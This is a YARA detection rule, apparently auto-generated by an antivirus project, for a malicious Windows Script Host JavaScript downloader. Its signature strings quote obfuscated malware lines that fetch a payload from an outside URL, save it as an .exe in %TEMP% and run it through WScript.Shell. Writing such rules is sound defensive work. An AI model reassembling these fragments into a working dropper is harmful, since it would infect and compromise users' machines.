rule sig_20160328_32e15636e87921187ce970d96063fcea {
  meta:
    description = "datamaliciousorder - file 20160328_32e15636e87921187ce970d96063fcea.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d24fbc5a26a6e4f0dfce3c8beaac249d10c374c93945466fd6e6aeeda6063b20"

  strings:
    $s1  = "function Kszcpe() {return Okohwbumhk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5uhr4L6AmdMp6S.exe\";};" fullword ascii
    $s2  = "do {WScript[Ufnpcmzh](Ycwvvtnxqd() * 11)} while (Hkbuevcukq[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Ojhmrx(Rzbhhyzz, Odbqzns){return Rzbhhyzz - Odbqzns;};" fullword ascii
    $s4  = "var Okohwbumhk = function Nknwini() {return WScript[Rynzaardnn](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Hkbuevcukq[Hocrds](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s6  = "function Cgquszuv() {return ((Dgfqw == true) && (Dgfqw == Ahbredrj)) ? 1 : Bnfeni;};" fullword ascii
    $s7  = "function Ynfeuuqfsm(Hdpkfx){Okohwbumhk[\"Run\"](Hdpkfx, Bnfeni, Bnfeni);};" fullword ascii
    $s8  = "function Ckcte(){return Kydgrpx;};" fullword ascii
    $s9  = "return Ojhmrx(Bczjcwirns, Utejdnpjko);" fullword ascii
    $s10 = "function Ycwvvtnxqd(){return 22;};" fullword ascii
    $s11 = " while (Ztladvb){" fullword ascii
    $s12 = "function Ncewk(){return Rynzaardnn;};" fullword ascii
    $s13 = "Dgfqw = true; " fullword ascii
    $s14 = "var Eybzwqv = new this[\"Date\"]();" fullword ascii
    $s15 = "function Lxjxzilyki(Dzgwrqn) {var Clrxdpaa = (1, 2, 3, 4, 5, Dzgwrqn); return Clrxdpaa;};" fullword ascii
    $s16 = "Ahbredrj = true; " fullword ascii
    $s17 = "var Ahbredrj = false;" fullword ascii
    $s18 = "var Dgfqw = false;" fullword ascii
    $s19 = "function Eeaipvvi()" fullword ascii
    $s20 = "var Pxcggkfev = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}